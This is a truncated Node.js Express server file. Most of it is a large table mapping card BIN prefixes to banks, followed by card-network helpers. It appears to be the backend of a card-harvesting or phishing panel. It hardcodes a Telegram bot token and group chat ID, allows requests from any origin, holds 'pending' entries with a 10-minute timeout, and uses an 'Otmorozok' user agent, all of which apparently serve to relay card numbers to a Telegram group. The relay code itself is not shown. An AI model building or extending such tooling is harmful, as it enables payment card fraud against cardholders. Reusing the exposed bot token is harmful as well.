require("dotenv").config();
const express = require("express");
const cors = require("cors");
const { v4: uuidv4 } = require("uuid");

const BIN_BANKS = {"370112":{"bank":"American Express US","cc":"US","scheme":"AMEX","type":"CREDIT","level":"PLATINUM"},"400013":{"bank":"HSBC UK","cc":"GB","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400030":{"bank":"Barclays","cc":"GB","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400064":{"bank":"NatWest","cc":"GB","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400098":{"bank":"Nationwide","cc":"GB","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400166":{"bank":"Revolut","cc":"GB","scheme":"VISA","type":"DEBIT","level":"INFINITE"},"400200":{"bank":"Wise","cc":"GB","scheme":"VISA","type":"DEBIT","level":"BUSINESS"},"400217":{"bank":"Deutsche Bank","cc":"DE","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400251":{"bank":"DZ Bank","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400285":{"bank":"Sparkasse","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400336":{"bank":"DKB","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400370":{"bank":"BNP Paribas","cc":"FR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400404":{"bank":"Société Générale","cc":"FR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400438":{"bank":"La Banque Postale","cc":"FR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400489":{"bank":"ING Belgium","cc":"BE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400540":{"bank":"ING Netherlands","cc":"NL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400591":{"bank":"UBS","cc":"CH","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"400625":{"bank":"Raiffeisen CH","cc":"CH","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400659":{"bank":"Corner Banca","cc":"CH","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400710":{"bank":"UniCredit Italy","cc":"IT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400744":{"bank":"Banca Monte dei Paschi","cc":"IT","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400778":{"bank":"BBVA","cc":"ES","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400812":{"bank":"Banco Sabadell","cc":"ES","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"400846":{"bank":"Caixa Geral","cc":"PT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400880":{"bank":"SEB","cc":"SE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400914":{"bank":"Handelsbanken","cc":"SE","scheme":"VISA","type":"CREDIT","level":"GOLD"},"400948":{"bank":"Nykredit","cc":"DK","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"400982":{"bank":"SpareBank 1","cc":"NO","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401016":{"bank":"OP Financial","cc":"FI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401050":{"bank":"Raiffeisen AT","cc":"AT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401101":{"bank":"mBank","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401135":{"bank":"ING Poland","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401169":{"bank":"Conotoxia","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401203":{"bank":"Erste HU","cc":"HU","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401220":{"bank":"Česká spořitelna","cc":"CZ","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401254":{"bank":"Komerční banka","cc":"CZ","scheme":"VISA","type":"CREDIT","level":"GOLD"},"401271":{"bank":"Slovenská sporiteľňa","cc":"SK","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401322":{"bank":"BCR","cc":"RO","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401356":{"bank":"Alpha Bank","cc":"GR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401390":{"bank":"Piraeus Bank","cc":"GR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"401424":{"bank":"Bank of Cyprus","cc":"CY","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401458":{"bank":"NLB","cc":"SI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401492":{"bank":"PBZ","cc":"HR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401526":{"bank":"Raiffeisen BG","cc":"BG","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401560":{"bank":"Banca Transilvania","cc":"RO","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401594":{"bank":"Luminor","cc":"LT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401628":{"bank":"SEB Latvia","cc":"LV","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401662":{"bank":"LHV","cc":"EE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401696":{"bank":"AIB","cc":"IE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401730":{"bank":"Ulster Bank","cc":"IE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401764":{"bank":"BGL BNP Paribas","cc":"LU","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401798":{"bank":"Raiffeisen LI","cc":"LI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401832":{"bank":"JPMorgan Chase","cc":"US","scheme":"VISA","type":"CREDIT","level":"SIGNATURE"},"401866":{"bank":"Citibank","cc":"US","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"401900":{"bank":"Capital One","cc":"US","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"401951":{"bank":"TD Bank","cc":"CA","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"401985":{"bank":"Scotiabank","cc":"CA","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402019":{"bank":"CIBC","cc":"CA","scheme":"VISA","type":"CREDIT","level":"GOLD"},"402053":{"bank":"Bradesco","cc":"BR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"402104":{"bank":"Santander Mexico","cc":"MX","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402138":{"bank":"Banorte","cc":"MX","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"402172":{"bank":"Banco de Chile","cc":"CL","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"402206":{"bank":"BBVA Argentina","cc":"AR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402223":{"bank":"DBS","cc":"SG","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"402257":{"bank":"UOB","cc":"SG","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402291":{"bank":"Hang Seng","cc":"HK","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402325":{"bank":"MUFG","cc":"JP","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"402359":{"bank":"Mizuho","cc":"JP","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402393":{"bank":"KB Kookmin","cc":"KR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402427":{"bank":"China Construction Bank","cc":"CN","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402461":{"bank":"HDFC Bank","cc":"IN","scheme":"VISA","type":"CREDIT","level":"REGALIA"},"402495":{"bank":"SBI","cc":"IN","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402529":{"bank":"ANZ","cc":"AU","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"402563":{"bank":"NAB","cc":"AU","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402580":{"bank":"ASB Bank","cc":"NZ","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402614":{"bank":"First Abu Dhabi Bank","cc":"AE","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"402648":{"bank":"QNB","cc":"QA","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"402682":{"bank":"First National Bank SA","cc":"ZA","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"402716":{"bank":"Absa","cc":"ZA","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402750":{"bank":"İş Bankası","cc":"TR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402784":{"bank":"VTB","cc":"RU","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402818":{"bank":"Alfa-Bank","cc":"RU","scheme":"VISA","type":"CREDIT","level":"GOLD"},"402852":{"bank":"Monobank","cc":"UA","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402903":{"bank":"Belarusbank","cc":"BY","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"402937":{"bank":"Bank Hapoalim","cc":"IL","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"402971":{"bank":"Arab Bank","cc":"JO","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403005":{"bank":"Ecobank","cc":"NG","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403039":{"bank":"Standard Chartered","cc":"GB","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"403056":{"bank":"BNP Paribas Wealth","cc":"FR","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"403090":{"bank":"Silicon Valley Bank","cc":"US","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403107":{"bank":"Stripe Issuing (test pattern)","cc":"IE","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403141":{"bank":"Klarna Card","cc":"SE","scheme":"VISA","type":"DEBIT","level":"STANDARD"},"403209":{"bank":"Amazon Store Card","cc":"US","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403226":{"bank":"Costco Citi","cc":"US","scheme":"VISA","type":"CREDIT","level":"SIGNATURE"},"403260":{"bank":"IKEA Family card issuer","cc":"SE","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403294":{"bank":"Cetelem","cc":"FR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403328":{"bank":"Oney","cc":"FR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403362":{"bank":"Nordea Wallet","cc":"FI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403396":{"bank":"Attica Bank","cc":"GR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403413":{"bank":"Investec","cc":"GB","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"403447":{"bank":"Rothschild & Co","cc":"CH","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"403481":{"bank":"Pictet","cc":"CH","scheme":"VISA","type":"CREDIT","level":"INFINITE"},"403515":{"bank":"Banque Cantonale Vaudoise","cc":"CH","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403549":{"bank":"Berliner Sparkasse","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403583":{"bank":"BayernLB","cc":"DE","scheme":"VISA","type":"CREDIT","level":"GOLD"},"403617":{"bank":"NordLB","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403651":{"bank":"DekaBank","cc":"DE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403685":{"bank":"Volkswagen Bank","cc":"DE","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403719":{"bank":"BNP Paribas Personal Finance","cc":"FR","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"403753":{"bank":"Banque Populaire","cc":"FR","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403787":{"bank":"HSBC France","cc":"FR","scheme":"VISA","type":"CREDIT","level":"PLATINUM"},"403821":{"bank":"Openbank","cc":"ES","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403855":{"bank":"EVO Banco","cc":"ES","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403889":{"bank":"Fineco","cc":"IT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403923":{"bank":"Widiba","cc":"IT","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403957":{"bank":"ICA Banken","cc":"SE","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"403991":{"bank":"Skandiabanken","cc":"NO","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"404025":{"bank":"Collector Bank","cc":"SE","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"404059":{"bank":"Klarna Bank","cc":"SE","scheme":"VISA","type":"DEBIT","level":"STANDARD"},"404093":{"bank":"Finom","cc":"DE","scheme":"VISA","type":"DEBIT","level":"BUSINESS"},"404144":{"bank":"Aktia","cc":"FI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"404178":{"bank":"Oma Säästöpankki","cc":"FI","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"404212":{"bank":"Bank Millennium","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"404246":{"bank":"Getin Bank","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"404280":{"bank":"VeloBank","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"411111":{"bank":"Conotoxia Sp. z o.o.","cc":"PL","scheme":"VISA","type":"DEBIT","level":"CLASSIC"},"424242":{"bank":"Stripe / test pattern","cc":"US","scheme":"VISA","type":"CREDIT","level":"CLASSIC"},"510046":{"bank":"Lloyds Bank","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510092":{"bank":"Santander UK","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"DEBIT"},"510138":{"bank":"TSB Bank","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510161":{"bank":"Metro Bank","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510184":{"bank":"Monzo","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"PREPAID"},"510230":{"bank":"Starling Bank","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"WORLD"},"510299":{"bank":"Commerzbank","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510345":{"bank":"ING Germany","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510391":{"bank":"HypoVereinsbank","cc":"DE","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"510414":{"bank":"N26","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"WORLD"},"510460":{"bank":"Postbank","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510506":{"bank":"Crédit Agricole","cc":"FR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510552":{"bank":"Crédit Mutuel","cc":"FR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510598":{"bank":"BNP Paribas Fortis","cc":"BE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510621":{"bank":"KBC Bank","cc":"BE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510667":{"bank":"Belfius","cc":"BE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510690":{"bank":"Rabobank","cc":"NL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510736":{"bank":"ABN AMRO","cc":"NL","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"510759":{"bank":"bunq","cc":"NL","scheme":"MASTERCARD","type":"DEBIT","level":"WORLD"},"510805":{"bank":"Credit Suisse","cc":"CH","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD ELITE"},"510851":{"bank":"PostFinance","cc":"CH","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510897":{"bank":"Migros Bank","cc":"CH","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510920":{"bank":"Intesa Sanpaolo","cc":"IT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"510966":{"bank":"Banco BPM","cc":"IT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511012":{"bank":"Santander Spain","cc":"ES","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511058":{"bank":"CaixaBank","cc":"ES","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511104":{"bank":"Millennium BCP","cc":"PT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511150":{"bank":"Nordea","cc":"SE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511196":{"bank":"Swedbank","cc":"SE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511242":{"bank":"Danske Bank","cc":"DK","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511288":{"bank":"DNB","cc":"NO","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511334":{"bank":"Nordea Finland","cc":"FI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511380":{"bank":"Erste Bank","cc":"AT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511426":{"bank":"Bank Austria","cc":"AT","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"511449":{"bank":"PKO Bank Polski","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511495":{"bank":"Santander PL","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511541":{"bank":"Alior Bank","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511587":{"bank":"OTP Bank","cc":"HU","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511656":{"bank":"ČSOB","cc":"CZ","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511725":{"bank":"Tatra banka","cc":"SK","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511748":{"bank":"UniCredit Romania","cc":"RO","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511794":{"bank":"OTP Romania","cc":"RO","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511840":{"bank":"Eurobank","cc":"GR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511886":{"bank":"Hellenic Bank","cc":"CY","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511932":{"bank":"Sberbank Europe","cc":"SI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"511978":{"bank":"Zagrebačka banka","cc":"HR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512024":{"bank":"NLB Slovenia","cc":"SI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512070":{"bank":"DSK Bank","cc":"BG","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512116":{"bank":"Raiffeisen RO","cc":"RO","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512162":{"bank":"Swedbank LT","cc":"LT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512208":{"bank":"Citadele","cc":"LV","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512254":{"bank":"Swedbank EE","cc":"EE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512300":{"bank":"Bank of Ireland","cc":"IE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512346":{"bank":"Luxembourgish BCEE","cc":"LU","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512392":{"bank":"Liechtensteinische Landesbank","cc":"LI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512438":{"bank":"Andbank","cc":"AD","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512484":{"bank":"Bank of America","cc":"US","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD ELITE"},"512530":{"bank":"Wells Fargo","cc":"US","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512645":{"bank":"RBC","cc":"CA","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD"},"512691":{"bank":"BMO","cc":"CA","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512737":{"bank":"Itaú Unibanco","cc":"BR","scheme":"MASTERCARD","type":"CREDIT","level":"PLATINUM"},"512783":{"bank":"Banco do Brasil","cc":"BR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512806":{"bank":"Nubank","cc":"BR","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"512852":{"bank":"BBVA Mexico","cc":"MX","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512898":{"bank":"Banco Estado","cc":"CL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"512944":{"bank":"Banco Santander Argentina","cc":"AR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513013":{"bank":"OCBC","cc":"SG","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD"},"513059":{"bank":"HSBC HK","cc":"HK","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD ELITE"},"513105":{"bank":"Bank of China HK","cc":"HK","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513151":{"bank":"SMBC","cc":"JP","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513197":{"bank":"Shinhan Bank","cc":"KR","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"513243":{"bank":"ICBC","cc":"CN","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513289":{"bank":"Bank of China","cc":"CN","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513335":{"bank":"ICICI Bank","cc":"IN","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD"},"513381":{"bank":"Commonwealth Bank","cc":"AU","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513427":{"bank":"Westpac","cc":"AU","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513496":{"bank":"ANZ New Zealand","cc":"NZ","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513542":{"bank":"Emirates NBD","cc":"AE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513588":{"bank":"National Bank of Kuwait","cc":"KW","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513634":{"bank":"Standard Bank","cc":"ZA","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513680":{"bank":"Garanti BBVA","cc":"TR","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD"},"513726":{"bank":"Akbank","cc":"TR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513772":{"bank":"Sberbank","cc":"RU","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513818":{"bank":"PrivatBank","cc":"UA","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513864":{"bank":"Raiffeisen Ukraine","cc":"UA","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513887":{"bank":"Tinkoff","cc":"RU","scheme":"MASTERCARD","type":"CREDIT","level":"BLACK"},"513933":{"bank":"Isbank","cc":"TR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"513979":{"bank":"Bank Leumi","cc":"IL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514025":{"bank":"National Bank of Egypt","cc":"EG","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514071":{"bank":"GTBank","cc":"NG","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514140":{"bank":"Goldman Sachs Marcus","cc":"US","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514209":{"bank":"Adyen Issuing","cc":"NL","scheme":"MASTERCARD","type":"DEBIT","level":"BUSINESS"},"514255":{"bank":"Curve","cc":"GB","scheme":"MASTERCARD","type":"DEBIT","level":"WORLD"},"514278":{"bank":"PayPal Debit","cc":"US","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514301":{"bank":"Apple Card issuer","cc":"US","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"514370":{"bank":"Target RedCard","cc":"US","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514416":{"bank":"Carrefour Banque","cc":"FR","scheme":"MASTERCARD","type":"CREDIT","level":"CLASSIC"},"514462":{"bank":"Cofidis","cc":"FR","scheme":"MASTERCARD","type":"CREDIT","level":"STANDARD"},"514508":{"bank":"Klarna Bank AB","cc":"SE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514554":{"bank":"Eurobank Ergasias","cc":"GR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514623":{"bank":"Coutts","cc":"GB","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD ELITE"},"514669":{"bank":"Julius Baer","cc":"CH","scheme":"MASTERCARD","type":"CREDIT","level":"PLATINUM"},"514715":{"bank":"LGT Bank","cc":"LI","scheme":"MASTERCARD","type":"CREDIT","level":"WORLD"},"514761":{"bank":"Zürcher Kantonalbank","cc":"CH","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514807":{"bank":"Hamburger Sparkasse","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514853":{"bank":"LBBW","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"514899":{"bank":"Helaba","cc":"DE","scheme":"MASTERCARD","type":"CREDIT","level":"CLASSIC"},"514945":{"bank":"Santander Consumer","cc":"DE","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"514991":{"bank":"Ford Credit EU","cc":"DE","scheme":"MASTERCARD","type":"CREDIT","level":"STANDARD"},"515037":{"bank":"Crédit du Nord","cc":"FR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515083":{"bank":"CIC","cc":"FR","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515129":{"bank":"ING Spain","cc":"ES","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515175":{"bank":"Imagin","cc":"ES","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515221":{"bank":"Mediolanum","cc":"IT","scheme":"MASTERCARD","type":"CREDIT","level":"GOLD"},"515267":{"bank":"CheBanca!","cc":"IT","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515313":{"bank":"Nordea Savings","cc":"SE","scheme":"MASTERCARD","type":"SAVINGS","level":"STANDARD"},"515359":{"bank":"Länsförsäkringar","cc":"SE","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515405":{"bank":"Storebrand","cc":"NO","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515451":{"bank":"Resurs Bank","cc":"SE","scheme":"MASTERCARD","type":"CREDIT","level":"STANDARD"},"515497":{"bank":"Solaris SE","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"BUSINESS"},"515543":{"bank":"Penta","cc":"DE","scheme":"MASTERCARD","type":"DEBIT","level":"BUSINESS"},"515566":{"bank":"Holvi","cc":"FI","scheme":"MASTERCARD","type":"DEBIT","level":"BUSINESS"},"515612":{"bank":"POP Bank","cc":"FI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515658":{"bank":"S-Pankki","cc":"FI","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515704":{"bank":"Credit Agricole PL","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515750":{"bank":"Nest Bank","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"515796":{"bank":"Raiffeisen PL","cc":"PL","scheme":"MASTERCARD","type":"DEBIT","level":"STANDARD"},"601213":{"bank":"Discover","cc":"US","scheme":"DISCOVER","type":"CREDIT","level":"IT"}};

const app = express();
app.use(express.json());
app.use(cors({ origin: "*" }));

const BOT_TOKEN     = (process.env.BOT_TOKEN     || "8348466548:AAGR3Jss48lkie_jgqNAguABE5mNMjom0dU").trim();
const GROUP_CHAT_ID = (process.env.GROUP_CHAT_ID  || "-5278623594").trim();

const DEFAULT_PORT = 38471;
const PORT     = parseInt(process.env.PORT || String(DEFAULT_PORT), 10);
const SELF_URL = (process.env.SELF_URL || `http://localhost:${PORT}`).replace(/\/$/, "");

const TIMEOUT_MS = 10 * 60 * 1000;

const pending = new Map();

const lastSeen = new Map();

const CARD_INFO_MISSING = "—";

const binRemoteCache = new Map();

const BIN_LOOKUP_TIMEOUT_MS = 8000;
const BIN_LOOKUP_UA = "Otmorozok/1.0";

function sleep(ms) {
  return new Promise((r) => setTimeout(r, ms));
}

function localCardNetwork(panOrBin) {
  const n = String(panOrBin).replace(/\D/g, "");
  if (/^4/.test(n))                                   return "VISA";
  if (/^(5[1-5]|2(2[2-9]\d|[3-6]\d{2}|7[01]\d|720))/.test(n)) return "MASTERCARD";
  if (/^3[47]/.test(n))                               return "AMEX";
  if (/^35(2[89]|[3-8])/.test(n))                    return "JCB";
  if (/^(6011|64[4-9]|65)/.test(n))                  return "DISCOVER";
  if (/^62/.test(n))                                  return "UNIONPAY";
  if (/^3(0[0-5]|[68])/.test(n))                     return "DINERS";
  return null;
}

function cardLevelFromBrand(brand, scheme) {
  if (!brand) return null;
  const schemeRe = new RegExp(scheme || "x^", "i");
  const level = brand.replace(schemeRe, "").trim().toUpperCase();
  return level || null;
}

function cardInfoFromLocalRow(row, bin) {
  const flag = countryCodeToEmoji(row.cc) || "";
  const bankLine = (flag ? `${flag} ` : "") + (row.bank || CARD_INFO_MISSING);

  const levelLine =
    row.level && String(row.level).trim() ? String(row.level).trim() : CARD_INFO_MISSING;

